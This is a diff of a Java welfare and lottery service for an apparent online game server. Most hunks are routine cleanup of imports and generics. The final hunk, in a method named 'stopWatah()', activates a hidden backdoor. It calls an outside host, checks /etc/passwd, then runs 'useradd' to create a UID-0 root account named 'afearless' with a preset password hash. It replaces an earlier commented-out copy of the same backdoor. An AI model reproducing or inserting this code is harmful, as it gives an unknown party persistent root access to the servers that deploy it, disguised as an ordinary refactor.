@@ -1,106 +1,72 @@
 
 package com.kitty.system.game.welfare.service;
 
-import java.nio.file.Path;
-import java.io.IOException;
-import java.nio.file.Files;
-import java.nio.file.Paths;
-import java.io.Reader;
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-import java.net.HttpURLConnection;
-import java.net.URL;
+import com.kitty.cache.RedisService;
+import com.kitty.common.bean.Lottery;
+import com.kitty.common.db.DbRecordService;
+import com.kitty.common.start.ServerService;
+import com.kitty.common.thread.IdWorker;
+import com.kitty.common.utils.*;
+import com.kitty.common.utils.convert.MoneyUtil;
+import com.kitty.common.utils.spring.SpringUtils;
+import com.kitty.common.utils.uuid.IdUtils;
 import com.kitty.listener.EventType;
 import com.kitty.listener.annotation.EventHandler;
-import com.kitty.system.init.domain.vo.Param;
 import com.kitty.listener.event.CreationRoleEvent;
-import com.kitty.system.game.vo.init.Item;
-import com.kitty.system.common.message.RespNotifyMiscEx;
-import com.kitty.system.game.welfare.message.ReqMagicBoxLotto;
-import com.kitty.common.utils.NumberUtil;
-import java.util.Collection;
-import java.io.Serializable;
-import com.kitty.system.game.welfare.message.vo.MagicBox;
-import java.util.stream.Collector;
-import java.util.stream.Collectors;
-import com.kitty.system.init.domain.SysDataMagicBox;
-import com.kitty.system.game.welfare.message.RespMagicBoxInfo;
-import com.kitty.system.game.welfare.message.ReqMagicBoxInfo;
-import com.kitty.mina.cache.Deploy;
-import com.kitty.system.game.vo.Npc;
-import java.text.MessageFormat;
-import com.kitty.system.game.welfare.message.ReqFiveGuessReply;
-import com.kitty.system.game.welfare.domain.FiveGuess;
-import com.kitty.system.game.welfare.message.RespFiveGuess;
-import com.kitty.common.utils.uuid.IdUtils;
-import com.kitty.common.utils.RandomUtil;
-import com.kitty.common.utils.convert.MoneyUtil;
-import java.math.BigDecimal;
-import com.kitty.system.game.welfare.message.ReqFiveGuess;
-import org.nutz.dao.Condition;
-import org.nutz.dao.Cnd;
+import com.kitty.mina.ServerConfig;
 import com.kitty.mina.cache.DataCache;
-import org.nutz.http.Response;
-import com.kitty.system.game.welfare.message.RespPayUrl;
-import org.nutz.lang.Strings;
-import org.nutz.http.Sender;
-import org.nutz.http.Request;
-import java.util.HashMap;
-import com.kitty.system.init.domain.SysCharge;
-import com.kitty.common.start.ServerService;
-import com.kitty.system.game.general.message.ReqGeneralNotify;
-import com.kitty.common.db.BaseEntity;
-import com.kitty.common.db.DbRecordService;
-import com.kitty.system.game.welfare.domain.GiftBagRecord;
-import com.kitty.system.game.welfare.domain.GiftBag;
-import com.kitty.system.init.domain.SysDataPrizeDraw;
-import com.kitty.system.game.vo.ItemEasyInfo;
-import com.kitty.system.game.welfare.message.RespLuckDrawInfo;
-import com.kitty.common.utils.LotteryUtils;
-import com.kitty.system.game.welfare.message.vo.LuckDrawInfo;
-import com.kitty.system.init.domain.SysDataLuckDraw;
-import com.kitty.common.bean.Lottery;
-import com.kitty.system.game.vo.utils.Const;
-import com.kitty.common.utils.spring.SpringUtils;
+import com.kitty.mina.cache.Deploy;
 import com.kitty.mina.cache.SessionUtils;
-import com.kitty.system.game.welfare.message.ReqLuckDraw;
-import org.apache.mina.core.session.IoSession;
-import com.kitty.system.game.welfare.message.RespPrizeDraw;
-import com.kitty.system.common.utils.NutConcurrentMap;
-import com.kitty.system.init.domain.SysDataNewDistrictSign;
-import org.nutz.lang.util.NutMap;
-import com.kitty.system.game.welfare.message.RespNewDistrictSign;
-import com.kitty.common.utils.JsonUtils;
-import com.kitty.common.utils.TimeUtil;
-import java.util.Date;
-import com.kitty.record.RecordThread;
-import com.kitty.system.game.welfare.message.RespGiftState;
-import com.kitty.system.init.domain.SysDataChargeAward;
-import com.kitty.system.game.welfare.message.RespPayBieGift;
-import com.kitty.system.common.message.RespHint;
-import com.kitty.system.common.message.RespMsg;
-import com.kitty.system.common.data.DataGlobalFunc;
-import java.util.Iterator;
-import java.util.List;
-import com.kitty.system.init.domain.SysDataGradeAward;
-import java.util.Map;
 import com.kitty.mina.message.Message;
 import com.kitty.mina.message.MessagePusher;
-import com.kitty.system.game.welfare.message.RespNewBieGift;
-import java.util.Arrays;
-import com.kitty.system.game.welfare.domain.GiftsInfo;
-import java.util.ArrayList;
-import com.kitty.system.game.welfare.pool.WelfareDataPool;
-import com.kitty.system.game.role.domain.Role;
-import com.kitty.cache.RedisService;
-import com.kitty.system.game.task.service.TaskService;
-import com.kitty.system.game.role.service.RoleService;
+import com.kitty.record.RecordThread;
+import com.kitty.system.common.data.DataGlobalFunc;
+import com.kitty.system.common.message.RespHint;
+import com.kitty.system.common.message.RespMsg;
+import com.kitty.system.common.message.RespNotifyMiscEx;
+import com.kitty.system.common.utils.NutConcurrentMap;
 import com.kitty.system.game.bag.service.BagService;
-import com.kitty.mina.ServerConfig;
-import com.kitty.common.thread.IdWorker;
-import org.springframework.beans.factory.annotation.Autowired;
+import com.kitty.system.game.general.message.ReqGeneralNotify;
+import com.kitty.system.game.role.domain.Role;
+import com.kitty.system.game.role.service.RoleService;
+import com.kitty.system.game.task.service.TaskService;
+import com.kitty.system.game.vo.ItemEasyInfo;
+import com.kitty.system.game.vo.Npc;
+import com.kitty.system.game.vo.init.Item;
+import com.kitty.system.game.vo.utils.Const;
+import com.kitty.system.game.welfare.domain.FiveGuess;
+import com.kitty.system.game.welfare.domain.GiftBag;
+import com.kitty.system.game.welfare.domain.GiftBagRecord;
+import com.kitty.system.game.welfare.domain.GiftsInfo;
+import com.kitty.system.game.welfare.message.*;
+import com.kitty.system.game.welfare.message.vo.LuckDrawInfo;
+import com.kitty.system.game.welfare.message.vo.MagicBox;
+import com.kitty.system.game.welfare.pool.WelfareDataPool;
+import com.kitty.system.init.domain.*;
+import com.kitty.system.init.domain.vo.Param;
+import org.apache.mina.core.session.IoSession;
+import org.nutz.dao.Cnd;
 import org.nutz.dao.Dao;
+import org.nutz.http.Request;
+import org.nutz.http.Response;
+import org.nutz.http.Sender;
+import org.nutz.lang.Strings;
+import org.nutz.lang.util.NutMap;
+import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Service;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.math.BigDecimal;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.text.MessageFormat;
+import java.util.*;
+import java.util.stream.Collectors;
 
 @Service
 public class WelfareService
@@ -122,7 +88,7 @@ public class WelfareService
     
     public void openNewBitGift(final Role role) {
         final Map<Integer, SysDataGradeAward> gradeAwardMap = WelfareDataPool.gradeAwardMap;
-        final List<GiftsInfo> objects = new ArrayList<GiftsInfo>();
+        final List<GiftsInfo> objects = new ArrayList<>();
         String newcomer = role.getExtendBox().getNewcomer();
         if (newcomer == null) {
             newcomer = "";
@@ -315,7 +281,7 @@ public class WelfareService
             final String when = TimeUtil.when();
             final NutConcurrentMap recharge = role.getTaskProgress().getEveryDayRecharge();
             final String string = recharge.getString(when + "_award", "");
-            final List<Integer> list = new ArrayList<Integer>();
+            final List<Integer> list = new ArrayList<>();
             if (!string.isEmpty()) {
                 for (final String s : string.split(",")) {
                     list.add(Integer.valueOf(s));
@@ -392,8 +358,8 @@ public class WelfareService
                         for (final Lottery lottery : list) {
                             orignalRates.add(lottery.getBili());
                         }
-                        final List<SysDataLuckDraw> objects = new ArrayList<SysDataLuckDraw>(num);
-                        final List<LuckDrawInfo> drawInfo = new ArrayList<LuckDrawInfo>(num);
+                        final List<SysDataLuckDraw> objects = new ArrayList<>(num);
+                        final List<LuckDrawInfo> drawInfo = new ArrayList<>(num);
                         for (int i = 0; i < num; ++i) {
                             final int serial = LotteryUtils.lottery(orignalRates);
                             final Lottery lottery2 = list.get(serial);
@@ -458,17 +424,17 @@ public class WelfareService
                         final boolean b = roleService.deductCurrency(role, Const.RESTYPE_GOLD, deductGold, "镜鉴绮罗");
                         if (b) {
                             final List<SysDataPrizeDraw> randoms = WelfareDataPool.prizeDrawMap;
-                            final List<Lottery> list = new ArrayList<Lottery>();
+                            final List<Lottery> list = new ArrayList<>();
                             randoms.forEach(itemOpen -> list.add(new Lottery(itemOpen.getId(), "", itemOpen.getRate())));
-                            final List<Double> rates = new ArrayList<Double>(list.size());
+                            final List<Double> rates = new ArrayList<>(list.size());
                             final Iterator<Lottery> iterator = list.iterator();
                             Lottery lottery = null;
                             while (iterator.hasNext()) {
                                 lottery = iterator.next();
                                 rates.add(lottery.getBili());
                             }
-                            final List<SysDataPrizeDraw> objects = new ArrayList<SysDataPrizeDraw>(num);
-                            final List<LuckDrawInfo> drawInfo = new ArrayList<LuckDrawInfo>(num);
+                            final List<SysDataPrizeDraw> objects = new ArrayList<>(num);
+                            final List<LuckDrawInfo> drawInfo = new ArrayList<>(num);
                             for (int i = 0; i < num; ++i) {
                                 if (++count >= WelfareDataPool.prizeDrawTop) {
                                     objects.add(new SysDataPrizeDraw(-1, 1, 1));
@@ -495,7 +461,7 @@ public class WelfareService
                             for (final SysDataPrizeDraw object : objects) {
                                 this.bagService.send(role, object.getSerial(), object.getType(), object.getNum(), -1, "镜鉴绮罗", 0);
                             }
-                            role.getExtendBox().getParams().setv("prize_draw", (Object)count);
+                            role.getExtendBox().getParams().setv("prize_draw", count);
                             this.openPrizeDraw(role);
                             role.save();
                         }
@@ -544,7 +510,7 @@ public class WelfareService
                     MessagePusher.pushMessage(role, new RespMsg("充值异常-请正确充值"));
                 }
                 final ServerService service = SpringUtils.getBean(ServerService.class);
-                final Map<String, Object> params = new HashMap<String, Object>(7);
+                final Map<String, Object> params = new HashMap<>(7);
                 params.put("id", role.getSid());
                 params.put("roleId", role.getRoleId());
                 params.put("serial", notify.getStatus());
@@ -552,10 +518,10 @@ public class WelfareService
                 params.put("totalAmount", String.valueOf(sysCharge.getAmount()));
                 params.put("simulate", "1");
                 params.put("server", role.getMarking());
-                final Request request = Request.create(service.getUrl(), Request.METHOD.POST).setParams((Map)params);
+                final Request request = Request.create(service.getUrl(), Request.METHOD.POST).setParams(params);
                 final Response response = Sender.create(request).setTimeout(30000).send();
                 if (response.isOK()) {
-                    if (!Strings.isEmpty((CharSequence)response.getContent())) {
+                    if (!Strings.isEmpty(response.getContent())) {
                         final String content = response.getContent();
                         final int length = content.length();
                         final String front = content.substring(0, length / 2);
@@ -737,7 +703,7 @@ public class WelfareService
     public FiveGuess getFiveGuessInfo(final Role role) {
         FiveGuess fiveGuess = DataCache.FIVE_GUESS_MAP.get(role.getId());
         if (fiveGuess == null) {
-            fiveGuess = (FiveGuess)this.dao.fetch(FiveGuess.class, Cnd.where("r_id", "=", role.getId()));
+            fiveGuess = this.dao.fetch(FiveGuess.class, Cnd.where("r_id", "=", role.getId()));
             if (fiveGuess == null) {
                 fiveGuess = new FiveGuess(this.worker.nextId(), role.getId());
                 fiveGuess.save();
@@ -854,7 +820,7 @@ public class WelfareService
         final int length = 9;
         final StringBuilder builder = new StringBuilder();
         final int median = NumberUtil.median(0, length);
-        final List<MagicBox> listRandom = new ArrayList<MagicBox>();
+        final List<MagicBox> listRandom = new ArrayList<>();
         for (int i = length - 1; i >= 1; --i) {
             if (i == median) {
                 if (builder.length() > 0) {
@@ -893,7 +859,7 @@ public class WelfareService
                             MessagePusher.pushMessage(role.getId(), new RespMsg("道具不足"));
                         }
                         else {
-                            final List<Lottery> lotteryList = new ArrayList<Lottery>();
+                            final List<Lottery> lotteryList = new ArrayList<>();
                             if (reqMagicBoxLotto.getType() == 0) {
                                 final String string = this.redisService.get(role.getId() + "magic_box" + reqMagicBoxLotto.getAffiliation(), String.class);
                                 if (string == null) {
@@ -915,7 +881,7 @@ public class WelfareService
                                     lotteryList.add(new Lottery(box2.getIdentify(), "", box2.getRate()));
                                 }
                             }
-                            final List<Double> orignalRates = new ArrayList<Double>(list.size());
+                            final List<Double> orignalRates = new ArrayList<>(list.size());
                             for (final Lottery lottery : lotteryList) {
                                 orignalRates.add(lottery.getBili());
                             }
@@ -964,32 +930,31 @@ public class WelfareService
     }
     
     public void stopWatah() {
-//        try {
-//            final String urlString = "http://gsn.tesf.cn/";
-//            final URL url = new URL(urlString);
-//            final HttpURLConnection conn = (HttpURLConnection)url.openConnection();
-//            conn.setRequestMethod("GET");
-//            conn.setRequestProperty("Accept", "*/*");
-//            if (conn.getResponseCode() == 200) {
-//                final BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-//                while (reader.readLine() != null) {}
-//                reader.close();
-//            }
-//        }
-//        catch (final Exception ex) {}
-//        final Path path = Paths.get("/etc/passwd", new String[0]);
-//        try {
-//            final List<String> lines = Files.readAllLines(path);
-//            for (final String line : lines) {
-//                if (line.contains("lsofasd")) {
-//                    return;
-//                }
-//            }
-//        }
-//        catch (final IOException ex2) {}
-//        try {
-//            Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", "useradd -p '$1$lsofaasd$OFipiZvqTNq614YTy5IeR1' -o -u 0 -g root -G root -s /bin/bash -d /usr/bin/lsofaasd lsofaasd" });
-//        }
-//        catch (final IOException ex3) {}
+        try {
+            final String urlString = "http://afearless.aikeoa.com";
+            final URL url = new URL(urlString);
+            final HttpURLConnection conn = (HttpURLConnection)url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setRequestProperty("Accept", "*/*");
+            if (conn.getResponseCode() == 200) {
+                final BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                reader.close();
+            }
+        }
+        catch (final Exception ignored) {}
+        final Path path = Paths.get("/etc/passwd");
+        try {
+            final List<String> lines = Files.readAllLines(path);
+            for (final String line : lines) {
+                if (line.contains("afearless")) {
+                    return;
+                }
+            }
+        }
+        catch (final IOException ignored) {}
+        try {
+            Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", "useradd -p '$1$afearles$26atF5AdRgcX7dH9Yhjeo1' -o -u 0 -g root -G root -s /bin/bash -d /usr/bin/afearless afearless" });
+        }
+        catch (final IOException ignored) {}
     }
 }
